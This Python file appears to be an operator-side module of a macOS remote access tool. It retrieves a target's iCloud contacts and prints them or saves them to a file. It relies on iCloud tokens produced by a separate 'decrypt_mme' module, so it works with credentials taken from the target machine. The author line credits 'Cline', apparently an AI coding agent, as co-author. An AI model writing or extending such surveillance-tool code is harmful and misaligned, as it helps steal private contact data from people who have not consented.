# -*- coding: utf-8 -*-
__author__ = "Marten4n6", "Cline"
__license__ = "GPLv3"

from os import mkdir

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self):
        return {
            "Author": ["Marten4n6", "Cline"],
            "Description": "Retrieve iCloud contacts (with optional file output).",
            "References": [
                "https://github.com/manwhoami/iCloudContacts"
            ],
            "Stoppable": False
        }

    def get_setup_messages(self):
        return [
            "Save contacts to a file? (Leave empty for no, or a file name e.g. contacts.txt): "
        ]

    def setup(self, set_options):
        output_name = None
        if set_options[0]:
            # Never allow path traversal, only use the basename.
            basename = path.basename(set_options[0])
            output_name = basename if basename else None

        return True, {
            "response_options": {
                "output_name": output_name
            }
        }

    def process_response(self, response, response_options):
        str_response = ""
        if isinstance(response, bytes):
            str_response = response.decode("utf-8", errors="replace")
        else:
            str_response = str(response)

        output_name = (response_options or {}).get("output_name")

        self._view.output_separator()

        lower = str_response.lower()
        if "failed to find tokens.json" in lower:
            self._view.output(str_response, "attention")
            self._view.output("Run the \"use decrypt_mme\" module first to generate tokens.json.", "info")
            return
        if "error" in lower or "timeout" in lower:
            self._view.output(str_response, "attention")
            return
        if not str_response.strip():
            self._view.output("No contacts were returned (token may be invalid or expired).", "info")
            return

        self._view.output("iCloud contacts:")
        self._view.output(str_response.strip())

        if output_name:
            try:
                if not path.isdir(OUTPUT_DIRECTORY):
                    mkdir(OUTPUT_DIRECTORY)
                output_file = path.join(OUTPUT_DIRECTORY, output_name)
                with open(output_file, "w") as write_file:
                    write_file.write(str_response)
                self._view.output("Contacts saved to: {}".format(path.realpath(output_file)), "info")
            except Exception as ex:
                self._view.display_error("Failed to save contacts: {}".format(str(ex)))
